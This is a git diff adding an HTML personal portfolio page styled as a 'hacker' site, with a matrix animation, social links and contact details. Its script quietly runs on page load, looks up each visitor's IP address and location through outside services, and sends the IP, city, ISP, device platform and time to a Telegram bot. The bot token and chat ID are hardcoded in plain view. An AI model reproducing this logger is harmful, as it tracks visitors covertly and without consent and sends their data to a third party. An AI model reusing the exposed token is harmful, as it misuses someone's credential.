@@ -1,3 +1,208 @@
 <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIYAM BOSS PRO | ACCESS GRANTED</title>
 
-             
+    <meta property="og:title" content="SIYAM BOSS PRO | ACCESS GRANTED">
+    <meta property="og:description" content="Explore the encrypted portfolio of Siyam. Click to enter the matrix.">
+    <meta property="og:image" content="https://i.ibb.co.com/rRt3ZvYx/SIYAM-BOSS-PRO.jpg"> <meta property="og:url" content="https://siyamboss.github.io">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        /* Matrix Animation Background */
+        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
+
+        body {
+            background-color: black;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px;
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            box-shadow: 0 0 25px #00ff00;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            z-index: 1;
+        }
+
+        h1 { font-size: 2.2em; text-shadow: 0 0 15px #00ff00; margin-bottom: 5px; color: #fff; }
+        
+        .status { font-size: 0.8em; color: #ff0000; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; }
+
+        .typing {
+            border-right: 2px solid #00ff00;
+            white-space: nowrap;
+            overflow: hidden;
+            display: inline-block;
+            font-size: 0.9em;
+            margin-bottom: 20px;
+            animation: typing 3.5s steps(30, end), blink-caret .75s step-end infinite;
+        }
+
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff00 } }
+
+        .btn {
+            display: block;
+            margin: 12px 0;
+            padding: 12px;
+            color: #00ff00;
+            text-decoration: none;
+            border: 1px solid #00ff00;
+            text-transform: uppercase;
+            font-weight: bold;
+            transition: 0.3s;
+            background: rgba(0, 255, 0, 0.05);
+            font-size: 14px;
+        }
+
+        .btn:hover {
+            background-color: #00ff00;
+            color: black;
+            box-shadow: 0 0 20px #00ff00;
+            transform: scale(1.02);
+        }
+
+        .audio-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: transparent;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 8px 12px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            z-index: 100;
+            border-radius: 5px;
+        }
+
+        .contact-info { margin-top: 20px; font-size: 0.75em; color: #888; line-height: 1.6; }
+        .flag { font-size: 2.5em; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix"></canvas>
+
+    <audio id="hackerAudio" loop>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
+    <button class="audio-btn" onclick="toggleAudio()">[ SOUND: OFF ]</button>
+
+    <div class="container">
+        <div class="flag">🇵🇸</div>
+        <div class="status">[ SYSTEM: ENCRYPTED ]</div>
+        <h1>SIYAM BOSS PRO</h1>
+        <p class="typing">Scanning Network for Intrusion...</p>
+        
+        <a href="https://github.com/SIYAMBOSS" class="btn" target="_blank">> REPOSITORIES</a>
+        <a href="https://wa.me/8801315127341?text=Target%20Identified" class="btn" style="border-color: #23d366; color: #23d366;">> WHATSAPP (SECURE)</a>
+        <a href="https://facebook.com/sadaf245sz" class="btn">> FACEBOOK PROFILE</a>
+
+        <div class="contact-info">
+            EMAIL: sadaf245sz@gmail.com<br>
+            BOT STATUS: ONLINE<br>
+            © 2026 SIYAM BOSS PRO
+        </div>
+    </div>
+
+    <script>
+        // --- 1. CONFIGURATION ---
+        const TELEGRAM_BOT_TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE'; 
+        const TELEGRAM_CHAT_ID = '7416528268';
+
+        // --- 2. VOICE GREETING ---
+        function welcomeVoice() {
+            const msg = new SpeechSynthesisUtterance();
+            msg.text = "Welcome to SIYAM BOSS PRO. Accessing your device metadata.";
+            msg.volume = 1;
+            msg.rate = 0.95;
+            msg.pitch = 0.8;
+            window.speechSynthesis.speak(msg);
+        }
+
+        window.onclick = () => {
+            welcomeVoice();
+            window.onclick = null; 
+        };
+
+        // --- 3. ORIGINAL IP LOGGER ---
+        async function sendOriginalIP() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const originalIP = ipData.ip;
+
+                const locRes = await fetch(`https://ipapi.co/${originalIP}/json/`);
+                const locData = await locRes.json();
+
+                const message = `🚀 *SIYAM BOSS PRO - ALERT*\n\n👤 *Visitor Detected!*\n🌐 IP: \`${originalIP}\`\n📍 Location: ${locData.city}, ${locData.country_name}\n🏢 ISP: ${locData.org}\n📱 Device: ${navigator.platform}\n🕒 Time: ${new Date().toLocaleString()}`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.error("Logger error"); }
+        }
+        sendOriginalIP();
+
+        // --- 4. MATRIX ANIMATION ---
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = "0101010101ABCDEFHIJKLMNOPQRSTUVWXYZ$#@%&*";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px arial';
+            drops.forEach((y, i) => {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, y * fontSize);
+                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawMatrix, 33);
+
+        // --- 5. AUDIO CONTROL ---
+        const audio = document.getElementById("hackerAudio");
+        const audioBtn = document.querySelector(".audio-btn");
+        function toggleAudio() {
+            if (audio.paused) {
+                audio.play();
+                audioBtn.innerHTML = "[ SOUND: ON ]";
+                audioBtn.style.background = "#00ff00";
+                audioBtn.style.color = "black";
+            } else {
+                audio.pause();
+                audioBtn.innerHTML = "[ SOUND: OFF ]";
+                audioBtn.style.background = "transparent";
+                audioBtn.style.color = "#00ff00";
+            }
+        }
+    </script>
+</body>
+  </html>
